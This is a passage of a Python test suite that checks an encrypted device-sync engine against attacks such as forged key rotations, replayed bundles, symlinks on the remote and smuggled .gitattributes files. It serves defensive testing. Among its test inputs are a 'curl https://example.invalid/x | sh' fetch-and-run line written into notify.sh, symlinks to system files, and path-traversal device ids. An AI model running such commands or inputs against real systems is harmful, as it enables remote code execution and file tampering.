#!/usr/bin/env python3
"""Offline checks of encrypted sync (hub_sync.py). No network, no Claude session, no hub server, no real store.

Simulated devices: each is its own config folder, state folder and store folder, all in one temporary folder, and they
meet only in one shared folder remote (and in a local bare git repo standing in for GitHub). Every store is named
hub-test-throwaway-*, and the engines run as a second instance, so the rule that a second instance touches only such
stores is in force throughout (one engine is built as the installed hub would be, to check what a second instance may
not do to its remote). The attacks found in review are each a case here: links on the remote, a removed device
forging a rotation, a keyless remote sending junk, the pairing envelope, a second instance wiping a live remote, links
and executables inside bundles, names with a newline, a missing head and a lost keyring race.

Run from hub/: /usr/bin/python3 tests/sync_check.py   (it sets the six HUB_* variables of a throwaway second instance itself
unless all six are set; with them set, they must describe a second instance)
"""
import hashlib, json, os, secrets, shutil, stat, subprocess, sys, tempfile, time
from pathlib import Path

ROOT = Path(tempfile.mkdtemp(prefix="hub-sync-check-"))
SIX = ("HUB_PORT", "HUB_STATE", "HUB_TMUX", "HUB_CONFIG", "HUB_KIT", "HUB_JOBS")
if not all(name in os.environ for name in SIX):  # a hub session carries HUB_STATE alone; this check brings its own six
    os.environ.update({"HUB_PORT": "8499", "HUB_STATE": str(ROOT / "hub-state"), "HUB_TMUX": "agent-hub-sync-check",
                       "HUB_CONFIG": str(ROOT / "hub-config.json"), "HUB_KIT": str(Path(__file__).resolve().parents[2] / "agent-memory-kit"),
                       "HUB_JOBS": str(ROOT / "jobs")})
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import hub_base as base
import hub_sync as sync
from hub_base import Refused

if base.STATE == base.INSTALLED["state"] or base.PORT == base.INSTALLED["port"]:
    raise SystemExit("These variables describe the installed hub; sync_check runs only as a second instance.")

fails = 0
PID = os.getpid()
ALPHA, BETA, OTHER = f"hub-test-throwaway-{PID}-alpha", f"hub-test-throwaway-{PID}-beta", f"not-a-throwaway-{PID}"
SECRET = f"zebra-marmalade-{PID}"  # a word that must never be readable on the remote


def check(label, ok, extra=""):
    global fails
    print(("PASS  " if ok else "FAIL  ") + label + ("" if ok else f"  [{extra}]"), flush=True)
    fails += 0 if ok else 1


def refused(work, words="", reason=None):
    try:
        work()
    except Refused as problem:
        right = words.lower() in str(problem).lower() and (reason is None or sync.kind_of(problem) == reason)
        return right, f"{problem} ({sync.kind_of(problem)})"
    return False, "not refused"


class Clock:
    def __init__(self):
        self.shift = 0.0

    def __call__(self):
        return time.time() + self.shift


def device(name: str, clock=None, github=None, second=True) -> sync.Sync:
    home = ROOT / name
    return sync.Sync(home / "config", home / "state", home / "stores", second=second, now=clock or time.time, github_url=github)


def git(store: Path, *args) -> str:
    return subprocess.run(["git", "-C", str(store), *args], capture_output=True, text=True, env={**base.ENV, **sync.GIT_ID}, check=True).stdout


def make_store(engine: sync.Sync, name: str, line: str):
    store = engine.stores / name
    (store / "project").mkdir(parents=True)
    (store / "ORG.md").write_text("# Principles\n\nThrowaway store for sync_check.\n")
    (store / ".gitignore").write_text(".memwrite.lock\n*.tmp\ndreams/_batch/\n")
    (store / "THROWAWAY-TEST-STORE.md").write_text("Made by tests/sync_check.py; safe to delete.\n")
    (store / "project" / "gotchas.md").write_text(f"# Gotchas\n\n- [2026-11-26] {line}\n")
    (store / "notify.sh").write_text("#!/bin/sh\n# sends nothing: a throwaway store\n")
    os.chmod(store / "notify.sh", 0o755)
    git(store, "init", "-q", "-b", "main")
    git(store, "add", "-A")
    git(store, "commit", "-q", "-m", "a new store")


def append(engine: sync.Sync, name: str, line: str, file="project/gotchas.md"):
    store = engine.stores / name
    with open(store / file, "a") as handle:
        handle.write(f"- [2026-11-26] {line}\n")
    git(store, "commit", "-q", "-am", "memwrite")


def lines(engine: sync.Sync, name: str, file="project/gotchas.md") -> str:
    path = engine.stores / name / file
    return path.read_text() if path.exists() else ""


def ok_sync(engine: sync.Sync, label: str):
    engine.sync()
    error = engine.st.get("error")
    check(f"{label}: sync ran without an error", error is None, error)


def err(engine: sync.Sync) -> str:
    return engine.st.get("error") or ""


def pair(old: sync.Sync, new: sync.Sync, where: dict, name: str) -> str:
    """The whole pairing: code, request, six digits on both sides, the person's confirm, the new device's first sync."""
    code = old.pair()["code"]
    joined = new.join({**where, "code": code, "name": name})
    old.sync()
    seen = old.status()["pairing"]
    assert seen["state"] == "confirm" and seen["check"] == joined["check"], (seen, joined)
    old.confirm_pair({"check": joined["check"]})
    new.sync()
    assert new.settings.get("enabled"), new.st
    return joined["check"]


def yes(engine: sync.Sync):
    """The person says, on that device, that the new keys were theirs."""
    view = engine.pending_view()
    if view:
        engine.ack_rotation({"id": view["id"]})


def remote_files(folder: Path) -> list:
    return [p for p in folder.rglob("*") if p.is_file()]


def newest_bundle(engine: sync.Sync):
    keys = engine._data()
    me = engine.settings["device"]["id"]
    seq = engine.st["seq"]
    return keys.name("bundle", me, str(seq)), seq


try:
    if not sync.tool("age"):
        raise SystemExit("age isn't installed: brew install age")
    remote = ROOT / "remote"
    folder = {"backend": "folder", "path": str(remote)}
    a, b = device("a"), device("b")

    # ── setup ──
    status = a.status()
    check("before setup, sync is off and names no device", not status["enabled"] and status["device"] is None and status["backend"] is None)
    make_store(a, ALPHA, f"alpha's first line {SECRET}")
    make_store(a, OTHER, f"a store a second instance must never send {SECRET}")
    made = a.setup({**folder, "name": "Device A"})
    key = made["recovery_key"]
    check("setup answers ok with a recovery key of 8 groups of 4", made.get("ok") and len(key) == 39 and key.count("-") == 7)
    check("the recovery key is not written anywhere on this device or the remote",
          not any(key.replace("-", "") in p.read_bytes().decode(errors="ignore").replace("-", "") for p in ROOT.rglob("*") if p.is_file()))
    leftover = a.dir / (sync.ROOT_TMP + "crashed")
    leftover.mkdir()
    sync.Sync(a.dir, a.state_dir, a.stores, second=True)
    check("a root-key folder a crash left behind is swept when sync starts", not leftover.exists())
    check("the keys folder is 0700 and each key file 0600", stat.S_IMODE(a.keys_dir.stat().st_mode) == 0o700
          and all(stat.S_IMODE(p.stat().st_mode) == 0o600 for p in a.keys_dir.iterdir() if not p.name.endswith(".pub")))
    ring = json.loads((remote / "keyring.json").read_text())
    check("the first keyring is signed by the root key, whose private half is only on the remote under the recovery key",
          ring["signer"] == "root" and sync.verified(sync.unsigned(ring), ring["sig"], ring["root"]) and not any("PRIVATE KEY" in p.read_text(errors="ignore") and "root" in p.name for p in ROOT.rglob("*") if p.is_file()))
    check("setup again is refused, with a reason", refused(lambda: a.setup(folder), "already on", "already_on")[0])
    check("setup into a remote that already holds a sync is refused", refused(lambda: device("x").setup(folder), "already holds", "remote_not_empty")[0])
    ok_sync(a, "A's first sync")
    status = a.status()
    check("GET shape: enabled, folder, its path as label, one device that is this one, not removed, no error kind",
          status["enabled"] and status["backend"] == "folder" and status["remote_label"] == str(remote) and status["removed"] is False
          and status["error_kind"] is None and [d["this"] for d in status["devices"]] == [True] and status["device"]["name"] == "Device A", status)
    by_name = {s["name"]: s for s in status["stores"]}
    check("the throwaway store syncs and is ok", by_name[ALPHA]["synced"] and by_name[ALPHA]["state"] == "ok" and by_name[ALPHA]["last_sent"], by_name.get(ALPHA))
    check("a store that isn't hub-test-throwaway-* is off, with the second-instance sentence",
          by_name[OTHER]["state"] == "off" and "second instance syncs only" in by_name[OTHER]["detail"], by_name.get(OTHER))
    check("turning that store on is refused with one sentence and reason second_instance",
          refused(lambda: a.set_store({"name": OTHER, "synced": True}), "A second instance syncs only hub-test-throwaway-* stores", "second_instance")[0])
    check("a second instance refuses to fetch into that store", refused(lambda: a._fetch(OTHER, {}, b"", "0123456789abcdef"), "second instance")[0])
    check("a store name with a trailing newline is not a store name", refused(lambda: a.guard(ALPHA + "\n"), "isn't a store name")[0] and not a.allowed(ALPHA + "\n"))
    check("GET ?recheck=1 runs the checks again", a.status(recheck=True)["needs"] == a.needs())

    # ── what the remote holds ──
    blobs = b"".join(p.read_bytes() for p in remote_files(remote))
    names = " ".join(str(p.relative_to(remote)) for p in remote_files(remote))
    for word in (ALPHA, OTHER, SECRET, "throwaway", "gotchas", "Device A"):
        check(f"{word!r} is in no remote file name or file", word not in names and word.encode() not in blobs)
    check("remote names are opaque", all(sync.REMOTE_NAME.fullmatch(n) for n in names.split()), names)

    # ── pairing: request, confirm, and nothing that holds the key ──
    clock_b = Clock()
    b = device("b", clock_b)
    paired = a.pair()
    code = paired["code"]
    check("asking for a code again while one is open answers the same code", a.pair() == paired)
    check("a pairing code is 6 groups of 4 from the unambiguous alphabet", len(code) == 29 and all(c in sync.ALPHABET for c in code.replace("-", "")))
    check("pairing: GET shows the code, state waiting and an empty check", a.status()["pairing"] == {"code": code, "expires_at": paired["expires_at"], "check": "", "state": "waiting"})
    check("nothing is written to the remote for a code: no envelope holds the key", not list((remote / "p").glob("*")) if (remote / "p").exists() else True)
    wrong = "-".join(["2222"] * 6)
    b.join({**folder, "code": wrong, "name": "Device B"})
    a.sync()
    check("a join with a wrong code is never seen by the device that made the code", a.status()["pairing"]["state"] == "waiting")
    b.off({})
    check("a join with no code at all is refused", refused(lambda: b.join({**folder, "code": "nope", "name": "Device B"}), "isn't a pairing code", "bad_code")[0])
    joined = b.join({**folder, "code": code.lower().replace("-", " "), "name": "Device B"})
    check("join (code typed in lowercase with spaces) answers ok with six digits", joined.get("ok") and len(joined["check"]) == 6 and joined["check"].isdigit())
    check("the joining device shows joining with the same digits, and is not on yet",
          b.status()["joining"]["check"] == joined["check"] and not b.status()["enabled"])
    request_files = list((remote / "p").glob("*"))
    raw_request = request_files[0].read_bytes() if request_files else b""
    a.sync()
    seen = a.status()["pairing"]
    check("the device that made the code now asks to confirm, with the same six digits", seen["state"] == "confirm" and seen["check"] == joined["check"], seen)
    b.sync()
    check("before the person confirms, the new device holds no key", not (b.keys_dir / "data.key").exists() and not b.settings.get("enabled"))
    remote_id = json.loads((remote / "remote.json").read_text())["id"]
    opened = sync.decrypt(sync.unb64(json.loads(raw_request)["ct"]), sync.code_keys(sync.read_code(code, 6, "x"), remote_id, "pair")["identity"]) if raw_request else b""
    check("the pairing request, opened with the code, holds only public keys and a name",
          raw_request and set(json.loads(opened)) == {"id", "recipient", "signer", "name"} and a._data().key not in opened and a._data().key.hex().encode() not in opened)
    check("a confirm without the digits is refused", refused(lambda: a.confirm_pair({}), "six digits", "bad_input")[0])
    wrong_digits = f"{(int(joined['check']) + 1) % 1_000_000:06d}"
    check("a confirm with digits other than the waiting device's is refused, and hands nothing over",
          refused(lambda: a.confirm_pair({"check": wrong_digits}), "aren't the ones", "wrong_check")[0] and a.status()["pairing"]["state"] == "confirm")
    a.confirm_pair({"check": joined["check"]})
    check("confirming twice is refused", refused(lambda: a.confirm_pair({"check": joined["check"]}), "No device is waiting", "nothing_to_confirm")[0])
    b.sync()
    check("after the confirm, the new device is on and holds the key", b.settings.get("enabled") and b._data().key == a._data().key)
    check("the pairing files are gone from the remote", not [p for p in (remote / "p").iterdir() if p.is_file()])
    a.cancel_pair()
    check("cancel clears the pairing", a.status()["pairing"] is None)
    c_late = device("c-late", clock=Clock())
    late_code = a.pair()["code"]
    c_late.join({**folder, "code": late_code, "name": "Too late"})
    c_late.now.shift = 601
    c_late.sync()
    check("a joining device that isn't confirmed within ten minutes gives up, with reason expired",
          not c_late.settings and c_late.status()["error_kind"] == "expired", c_late.status())
    a.cancel_pair()

    # a pairing outlives no restart
    a.pair()
    restarted = device("a")
    restarted.sync()
    check("after a restart, what a pairing left on the remote is removed on the next sync", not [p for p in (remote / "p").iterdir() if p.is_file()] and not restarted.st.get("pair_files"))
    a = restarted

    # ── sync both ways ──
    ok_sync(b, "B's first sync")
    check("B now has the store A sent, with its line", SECRET in lines(b, ALPHA))
    check("B never received the store a second instance must not touch", not (b.stores / OTHER).exists())
    check("B's store from a bundle keeps notify.sh only switched off (it isn't the kit's own)",
          not os.access(b.stores / ALPHA / "notify.sh", os.X_OK) and "switched off" in ({s["name"]: s for s in b.status()["stores"]}[ALPHA]["detail"] or ""))
    make_store(b, BETA, "beta, made on B")
    ok_sync(b, "B sends its new store")
    ok_sync(a, "A takes B's store")
    check("A has the store that was made on B", "beta, made on B" in lines(a, BETA))
    check("A sees two devices, and who added each", sorted((d["name"], d["added_by"]) for d in a.status()["devices"]) == [("Device A", "setup"), ("Device B", "Device A")], a.status()["devices"])

    # ── concurrent appends ──
    append(a, ALPHA, "a line written on A")
    append(b, ALPHA, "a line written on B")
    append(b, ALPHA, "a second line written on B")
    ok_sync(a, "A sends its append")
    ok_sync(b, "B merges A's append and sends its own")
    ok_sync(a, "A merges B's appends")
    ok_sync(b, "B settles")
    for engine, who in ((a, "A"), (b, "B")):
        text = lines(engine, ALPHA)
        check(f"on {who} no line was lost", all(w in text for w in (SECRET, "a line written on A", "a line written on B", "a second line written on B")), text)
        check(f"on {who} the store's tree is clean", git(engine.stores / ALPHA, "status", "--porcelain", "--untracked-files=no").strip() == "")
    check("A and B end on the same commit", git(a.stores / ALPHA, "rev-parse", "HEAD") == git(b.stores / ALPHA, "rev-parse", "HEAD"))
    check("the index was rebuilt by the kit after the merge", (a.stores / ALPHA / "INDEX.md").exists() and "a line written on B" in (a.stores / ALPHA / "INDEX.md").read_text())

    # ── bundles: tampered, replayed, rolled back, missing, head deleted ──
    append(b, ALPHA, "a line before tampering")
    ok_sync(b, "B sends")
    name, seq = newest_bundle(b)
    path = remote / name
    original = path.read_bytes()
    spoilt = bytearray(original)
    spoilt[len(spoilt) // 2] ^= 1
    path.write_bytes(bytes(spoilt))
    before = git(a.stores / ALPHA, "rev-parse", "HEAD")
    a.sync()
    check("a tampered bundle is refused before decrypting, with reason remote_refused", "failed its check" in err(a) and a.status()["error_kind"] == "remote_refused", err(a))
    check("the tampered bundle changed nothing in the store", git(a.stores / ALPHA, "rev-parse", "HEAD") == before)
    path.write_bytes(original)
    ok_sync(a, "A after the file is put back")

    append(b, ALPHA, "line after replay")
    ok_sync(b, "B sends")
    name_new, seq_new = newest_bundle(b)
    keep = (remote / name_new).read_bytes()
    old_name = b._data().name("bundle", b.settings["device"]["id"], str(seq_new - 1))
    (remote / name_new).write_bytes((remote / old_name).read_bytes())
    a.sync()
    check("an old bundle replayed under the next name is refused", "failed its check" in err(a), err(a))
    (remote / name_new).write_bytes(keep)
    ok_sync(a, "A after the replay is undone")

    head_name = b._data().name("head", b.settings["device"]["id"])
    old_head = (remote / head_name).read_bytes()
    append(b, ALPHA, "line after rollback")
    ok_sync(b, "B sends")
    ok_sync(a, "A takes it")
    new_head = (remote / head_name).read_bytes()
    (remote / head_name).write_bytes(old_head)
    a.sync()
    check("a head rolled back to an older one is refused", "rollback" in err(a), err(a))
    (remote / head_name).unlink()
    a.sync()
    check("a deleted head is reported, not passed over", "missing from the remote" in err(a), err(a))
    (remote / head_name).write_bytes(new_head)
    ok_sync(a, "A after the head is put back")

    append(b, ALPHA, "middle one")
    ok_sync(b, "B sends the middle bundle")
    middle, _ = newest_bundle(b)
    append(b, ALPHA, "last one")
    ok_sync(b, "B sends the last bundle")
    kept = (remote / middle).read_bytes()
    (remote / middle).unlink()
    a.sync()
    check("a deleted middle bundle is found and named", "missing from the remote" in err(a), err(a))
    check("nothing after the gap was taken", "last one" not in lines(a, ALPHA))
    (remote / middle).write_bytes(kept)
    ok_sync(a, "A after the bundle is back")
    check("both lines arrive once the gap is filled", "middle one" in lines(a, ALPHA) and "last one" in lines(a, ALPHA))

    # ── what a bundle may hold (a paired device that went bad), through the real fetch and merge ──
    x1, x2 = device("x1"), device("x2")
    xr = {"backend": "folder", "path": str(ROOT / "x-remote")}
    make_store(x1, ALPHA, "x line")
    x1.setup({**xr, "name": "X1"})
    x1.sync()
    pair(x1, x2, xr, "X2")
    x2.sync()
    x1.sync()
    s2 = x2.stores / ALPHA
    x2_id = x2.settings["device"]["id"]

    def offer(label_commit):
        """A bundle of x2's newest commit, handed to x1 as the next bundle would be."""
        out = ROOT / "offer.bundle"
        base_tip = git(x1.stores / ALPHA, "rev-parse", "HEAD").strip()
        git(s2, "bundle", "create", "-q", str(out), "HEAD", "--not", base_tip)
        try:
            x1._fetch(ALPHA, {"branch": "main"}, out.read_bytes(), x2_id)
            return None
        except sync.Rejected as problem:
            return str(problem)
        finally:
            git(s2, "reset", "-q", "--hard", "HEAD~1")

    before = git(x1.stores / ALPHA, "rev-parse", "HEAD")
    os.symlink("/etc/hosts", s2 / "project" / "decisions.md")
    git(s2, "add", "-A")
    git(s2, "commit", "-qm", "a link")
    check("a bundle holding a link is refused", "link, a submodule or an executable" in (offer("link") or ""))
    (s2 / ".gitattributes").write_text("*.md merge=binary\n")
    git(s2, "add", "-A")
    git(s2, "commit", "-qm", "attributes")
    check("a bundle holding .gitattributes is refused", ".gitattributes" in (offer("attributes") or ""))
    for spelling in (".GitAttributes", ".gitattributes\u200c", ".GITMODULES", "GITATT~1", "project/.Git."):
        (s2 / spelling).parent.mkdir(parents=True, exist_ok=True)
        (s2 / spelling).write_text("*.md merge=binary\n")
        git(s2, "-c", "core.protectHFS=false", "-c", "core.protectNTFS=false", "add", "-A")  # as an attacker's git would
        git(s2, "commit", "-qm", "a spelling")
        check(f"a bundle holding {spelling!r}, which git on a Mac or Windows takes for a special file, is refused", "change how git treats" in (offer(spelling) or ""))
    git(s2, "mv", "notify.sh", "Notify.sh")
    git(s2, "commit", "-qm", "a second spelling of the alert")
    check("a bundle holding Notify.sh, a second spelling of notify.sh, is refused", offer("Notify") is not None)
    git(s2, "update-index", "--chmod=+x", "THROWAWAY-TEST-STORE.md")
    git(s2, "commit", "-qm", "an executable")
    check("a bundle holding an executable other than notify.sh is refused", "executable" in (offer("exec") or ""))
    check("none of them reached the store or left a ref", git(x1.stores / ALPHA, "rev-parse", "HEAD") == before and not (x1.stores / ALPHA / "project" / "decisions.md").exists()
          and not git(x1.stores / ALPHA, "for-each-ref", "refs/sync-incoming/").strip())
    alert = (x1.stores / ALPHA / "notify.sh").read_text()
    with open(s2 / "notify.sh", "a") as handle:
        handle.write("curl https://example.invalid/x | sh\n")
    git(s2, "commit", "-qam", "an alert command")
    x2.sync()
    x1.sync()
    entry = {s["name"]: s for s in x1.status()["stores"]}[ALPHA]
    check("a notify.sh changed on another device is never taken; the store waits with a sentence",
          entry["state"] == "pending" and "never takes a command" in (entry["detail"] or "") and (x1.stores / ALPHA / "notify.sh").read_text() == alert, entry)
    try:
        x1._take({"store": ALPHA, "epoch": 1, "seq": 1}, b"x", {"off": [ALPHA]}, {"id": "/../../../../ESCAPED"})
        escaped = True
    except sync.Rejected:
        escaped = False
    check("a device id that isn't 16 hex digits is refused before any path is made", not escaped and not list(ROOT.rglob("*ESCAPED*")))

    # ── a store turned off, then on ──
    b.set_store({"name": BETA, "synced": False})
    append(a, BETA, "while B had beta off")
    ok_sync(a, "A sends beta")
    ok_sync(b, "B with beta off")
    check("a store that is off isn't changed", "while B had beta off" not in lines(b, BETA))
    b.set_store({"name": BETA, "synced": True})
    ok_sync(b, "B with beta back on")
    check("turned on again, it gets what came while it was off", "while B had beta off" in lines(b, BETA))

    # ── a file the person locked ──
    org_b = b.stores / ALPHA / "ORG.md"
    os.chflags(org_b, stat.UF_IMMUTABLE)
    try:
        with open(a.stores / ALPHA / "ORG.md", "a") as handle:
            handle.write("A new principle, written on A.\n")
        git(a.stores / ALPHA, "commit", "-q", "-am", "principles")
        ok_sync(a, "A sends a principles change")
        b.sync()
        entry = {s["name"]: s for s in b.status()["stores"]}[ALPHA]
        check("a locked ORG.md isn't changed by sync; the store waits with a sentence", entry["state"] == "pending" and "chflags nouchg" in (entry["detail"] or ""), entry)
    finally:
        os.chflags(org_b, 0)
    ok_sync(b, "B with the lock lifted")
    check("with the lock lifted, the change arrives", "A new principle" in org_b.read_text())

    # ── keyless junk on the remote never stops sync ──
    ring_path = remote / "keyring.json"
    real_ring = ring_path.read_bytes()
    ring = json.loads(real_ring)
    for label, junk in (("[]", "[]"), ("wraps as a list", json.dumps({**ring, "wraps": []})), ("a non-ASCII signature", json.dumps({**ring, "sig": "é"})),
                        ("a bigger epoch with no wraps", json.dumps({**ring, "epoch": ring["epoch"] + 1, "wraps": {}})),
                        ("a bigger epoch, signed by nobody", json.dumps({**ring, "epoch": ring["epoch"] + 1, "rev": ring["rev"] + 1, "signer": "root", "sig": "x"}))):
        ring_path.write_text(junk)
        try:
            b.sync()
            raised = None
        except Exception as problem:
            raised = problem
        check(f"keyring {label}: sync returns, says so, and B is not marked removed", raised is None and err(b) and not b.status()["removed"], (raised, err(b)))
    ring_path.write_text(json.dumps({**ring, "sig": "é"}))
    b.sync()
    check("an unsigned keyring at the pin's step is junk, put back, never called a fork", b.status()["error_kind"] != "fork" and json.loads(ring_path.read_text()) == json.loads(real_ring), err(b))
    ok_sync(b, "B after the junk (it put its own keyring back)")
    check("B put the real keyring back on the remote", json.loads(ring_path.read_text()) == json.loads(real_ring))
    ring_path.write_text("[]")
    b.start()
    b.wake.set()
    time.sleep(3)
    check("the background thread outlives a junk keyring", b.thread.is_alive())
    ring_path.write_bytes(real_ring)
    ring_path.unlink()
    os.symlink("/dev/zero", ring_path)
    started = time.monotonic()
    a.sync()
    check("a keyring that is a link to /dev/zero is refused at once, not read", time.monotonic() - started < 20 and err(a), err(a))
    ring_path.unlink()
    ring_path.write_bytes(b"{" + b" " * (sync.RING_CAP + 10) + b"}")
    a.sync()
    check("a keyring bigger than its cap is refused", "bigger than sync ever makes" in err(a), err(a))
    ring_path.write_bytes(real_ring)
    ok_sync(a, "A after the keyring is back")

    # ── links on the remote: never followed, never deleted through ──
    victim = ROOT / "victim-documents"
    victim.mkdir()
    for n in ("thesis.docx", "taxes.pdf"):
        (victim / n).write_text("precious")
    shutil.move(str(remote / "o"), str(ROOT / "o-real"))
    os.symlink(victim, remote / "o")
    a.sync()
    check("an o/ that is a link is refused with a sentence", "is a link or not a folder" in err(a), err(a))
    check("remove_device over a linked o/ is refused", refused(lambda: a.remove_device({"id": b.settings["device"]["id"], "recovery_key": key}), "link")[0])
    check("nothing in the link's target was deleted or written", sorted(p.name for p in victim.iterdir()) == ["taxes.pdf", "thesis.docx"])
    (remote / "o").unlink()
    shutil.move(str(ROOT / "o-real"), str(remote / "o"))
    os.symlink(victim / "thesis.docx", remote / "p" / ("0" * 40))
    try:
        a._backend(a.settings).read("p/" + "0" * 40)
        followed = True
    except sync.Rejected:
        followed = False
    check("reading a linked remote file is refused, not followed", not followed)
    check("listing skips links", f"p/{'0' * 40}" not in a._backend(a.settings).names("p"))
    try:
        a._backend(a.settings).delete("../victim-documents/thesis.docx")
        deleted_outside = True
    except sync.Rejected:
        deleted_outside = False
    check("a delete of a name sync never makes is refused", not deleted_outside and (victim / "thesis.docx").exists())
    (remote / "p" / ("0" * 40)).unlink()
    ok_sync(a, "A after the links are gone")

    # ── a third device, then removed; it forges a rotation ──
    c = device("c")
    pair(a, c, folder, "Device C")
    ok_sync(c, "C's first sync")
    ok_sync(b, "B learns of C")
    check("C has both stores", SECRET in lines(c, ALPHA) and "beta, made on B" in lines(c, BETA))
    old_keys = c._data()
    c_id, b_id = c.settings["device"]["id"], b.settings["device"]["id"]
    check("removing a device without the recovery key is refused", refused(lambda: a.remove_device({"id": c_id}), "recovery key")[0])
    check("removing a device with a wrong recovery key is refused", refused(lambda: a.remove_device({"id": c_id, "recovery_key": "-".join(["ABCD"] * 8)}), "doesn't open", "wrong_recovery_key")[0])
    real_ring = ring_path.read_bytes()
    c._publish(c._backend(c.settings), c._pinned(), {**c._pinned(), "members": [m for m in c._pinned()["members"] if m["id"] != b_id],
               "wraps": {k: v for k, v in c._pinned()["wraps"].items() if k != b_id}, "signer": c_id}, c._sign_as_device)
    b.sync()
    check("a member device that signs another device out, without the recovery key, is refused", "without the recovery key" in err(b) and b.settings.get("enabled"), err(b))
    check("and the device that refused it put the real keyring back", json.loads(ring_path.read_text()) == json.loads(real_ring))
    ok_sync(a, "A after the attempt")
    ok_sync(b, "B after the attempt")
    # C, still a member, plants a device of its own and tries to make it look like one of yours
    sleeper = device("sleeper")
    sleeper._private(sleeper.dir)
    pin_c = c._pinned()
    twin = sleeper._new_device("Device B")
    real_ring = ring_path.read_bytes()
    c._publish(c._backend(c.settings), pin_c, {**pin_c, "members": pin_c["members"] + [c._member(twin, c_id)],
               "wraps": {**pin_c["wraps"], twin["id"]: sync.b64(sync.encrypt(c._data().key, [twin["recipient"]]))}, "signer": c_id}, c._sign_as_device)
    a.sync()
    check("a device added under the name of one already in sync is refused", "a name another device already has" in err(a), err(a))
    ring_path.write_bytes(real_ring)
    a.sync()
    planted = sleeper._new_device("Sleeper phone")
    body_c = c._body(pin_c, c._data())
    body_c["devices"][planted["id"]] = {"name": "Sleeper phone", "added": "2026-01-01T00:00:00Z", "added_by": "setup"}
    as_setup = {**pin_c, "members": pin_c["members"] + [{**c._member(planted, "setup")}], "wraps": {**pin_c["wraps"], planted["id"]: sync.b64(sync.encrypt(c._data().key, [planted["recipient"]]))},
                "body": c._seal_body(body_c, c._data()), "signer": c_id}
    real_ring = ring_path.read_bytes()
    c._publish(c._backend(c.settings), pin_c, as_setup, c._sign_as_device)
    a.sync()
    check("a device a member added but labelled as added by setup is refused", "said someone else added it" in err(a), err(a))
    check("and A put the real keyring back", json.loads(ring_path.read_text()) == json.loads(real_ring))
    honest = {**as_setup, "members": pin_c["members"] + [c._member(planted, c_id)]}
    c._publish(c._backend(c.settings), pin_c, honest, c._sign_as_device)
    sleeper._start(c._backend(c.settings), c._data(), json.loads(ring_path.read_text()), planted, created=False)
    ok_sync(a, "A takes the keyring with C's own device")
    listed = {d["id"]: d for d in a.status()["devices"]}
    check("the device list says who really added it, from the signed entry", listed[planted["id"]]["added_by"] == "Device C", listed[planted["id"]])
    ok_sync(b, "B takes it")
    ok_sync(c, "C takes it")
    # B is a laggard from here: it doesn't sync until after C's forgery
    removed = a.remove_device({"id": c_id, "recovery_key": key})
    old_key, key = key, removed.get("recovery_key", "")
    check("removing a device answers ok, a NEW recovery key, and tells the person to take the removed device's access away",
          removed.get("ok") and "access" in removed.get("advice", "") and len(key) == 39 and key != old_key, removed)
    check("the device the removed one added is removed too, and named in the answer",
          [(x["id"], x["added_by"]) for x in removed.get("also_removed", [])] == [(planted["id"], "Device C")], removed.get("also_removed"))
    new_ring = json.loads(ring_path.read_text())
    check("the removal rotated the root key, and the old root handed it over", new_ring["root"] != pin_c["root"] and sync.root_signed_by(new_ring, pin_c["root"]))
    sleeper.sync()
    check("the planted device can't read anything sent after the removal", sleeper.status()["removed"] or "removed" in err(sleeper), err(sleeper))
    # C, removed, still has K1, its own signing key and the other devices' public keys, and can write to the remote.
    pinned = c._pinned()
    forged_keys = sync.Keys(secrets.token_bytes(32), pinned["epoch"] + 1)
    forged = {**pinned, "epoch": forged_keys.epoch, "kid": forged_keys.kid, "rev": pinned["rev"] + 1, "prev": sync.digest(pinned),
              "wraps": {m["id"]: sync.b64(sync.encrypt(forged_keys.key, [m["recipient"]])) for m in pinned["members"]}, "signer": c_id, "sig": ""}
    forged["sig"] = c._sign_as_device(sync.unsigned(forged))
    real_after = ring_path.read_bytes()
    ring_path.write_text(json.dumps(forged))
    (remote / "k" / f"{forged['rev']:08d}.json").write_text(json.dumps(forged))
    append(b, ALPHA, f"B's secret after C was removed {SECRET}-3")
    laggard_seq = b.st["seq"]
    b.sync()
    check("the laggard refuses a rotation a removed device signed, and pauses", any(w in err(b) for w in ("without the recovery key", "can't be checked", "holds back")) and b.status()["error_kind"] == "paused", err(b))
    check("the laggard kept its key and took no forged one", b._data().key == old_keys.key and b._data().key != forged_keys.key)
    check("while a newer epoch it can't check is on the remote, the laggard sends nothing", b.st["seq"] == laggard_seq and "holds back" in err(b), (b.st["seq"], laggard_seq))
    check("nothing B wrote opens with the forged key", not (remote / forged_keys.name("head", b_id)).exists())
    a.sync()
    check("A refuses the forgery and puts the real keyring back", json.loads(ring_path.read_text()) == json.loads(real_after), err(a))
    b.sync()
    view = b.status()["pending_rotation"]
    check("B takes the real rotation but asks first: who did it, and whom it removed", view and view["by"] == "Device A" and sorted(view["removed"]) == ["Device C", "Sleeper phone"]
          and b.status()["error_kind"] == "pending_rotation", view)
    check("until the person says yes, B sends nothing", b.st["seq"] == 0, b.st["seq"])
    check("a yes for other keys is refused", refused(lambda: b.ack_rotation({"id": "0" * 16}), "aren't the keys", "stale_ack")[0])
    yes(b)
    ok_sync(b, "B follows the real rotation")
    check("B, still in, holds the new epoch", b._data().epoch == old_keys.epoch + 1)
    # C keeps restoring the old keyring
    ring_path.write_bytes(json.dumps(pinned).encode())
    b.sync()
    # B's background thread (started above) may get there first, so the check is on what happened, not on which sync saw it
    check("an old keyring restored by the removed device is a rollback, refused", b._pinned()["epoch"] == old_keys.epoch + 1 and b._data().epoch == old_keys.epoch + 1, err(b))
    check("and B put the newer one back", json.loads(ring_path.read_text())["epoch"] == old_keys.epoch + 1)
    append(a, ALPHA, f"after removal {SECRET}-2")
    ok_sync(a, "A sends under the new key")
    ok_sync(b, "B takes it")
    check("B gets the change made after the removal", f"{SECRET}-2" in lines(b, ALPHA))
    c.sync()
    check("C is told it was removed, from a keyring that checked out", c.status()["removed"] and c.status()["error_kind"] == "removed", c.status())
    check("C didn't get the change", f"{SECRET}-2" not in lines(c, ALPHA))
    files = [p for p in (remote / "o").iterdir()]
    readable = 0
    for p in files:
        try:
            old_keys.unpack(f"o/{p.name}", p.read_bytes())
            readable += 1
        except sync.Rejected:
            pass
    check("no file on the remote opens with the removed device's key", files and readable == 0, f"{readable} of {len(files)}")
    check("A and B list two devices", len(a.status()["devices"]) == 2 and len(b.status()["devices"]) == 2)

    # ── the removed device replays the old history to a device that recovers ──
    keep_k = {p.name: p.read_bytes() for p in (remote / "k").iterdir()}
    keep_ring = ring_path.read_bytes()
    ring_path.write_text(json.dumps(pinned))
